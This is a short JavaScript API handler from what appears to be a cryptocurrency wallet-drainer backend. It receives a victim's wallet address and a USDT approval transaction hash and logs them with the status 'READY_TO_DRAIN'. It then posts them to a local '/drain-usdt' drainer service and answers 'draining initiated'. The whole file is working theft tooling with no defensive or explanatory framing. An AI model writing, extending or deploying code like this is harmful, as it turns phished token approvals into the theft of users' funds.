export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { userAddress, txHash, timestamp } = req.body;

  try {
    console.log('🎯 USDT APPROVAL DETECTED:', {
      user: userAddress,
      txHash: txHash,
      timestamp: timestamp,
      status: 'READY_TO_DRAIN'
    });

    // Trigger the drainer service
    await fetch('http://localhost:3002/drain-usdt', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress: userAddress,
        approvalTxHash: txHash
      })
    });

    res.status(200).json({
      success: true,
      message: 'Approval logged, draining initiated'
    });

  } catch (error) {
    console.error('Error processing USDT approval:', error);
    res.status(500).json({ error: 'Failed to process approval' });
  }
}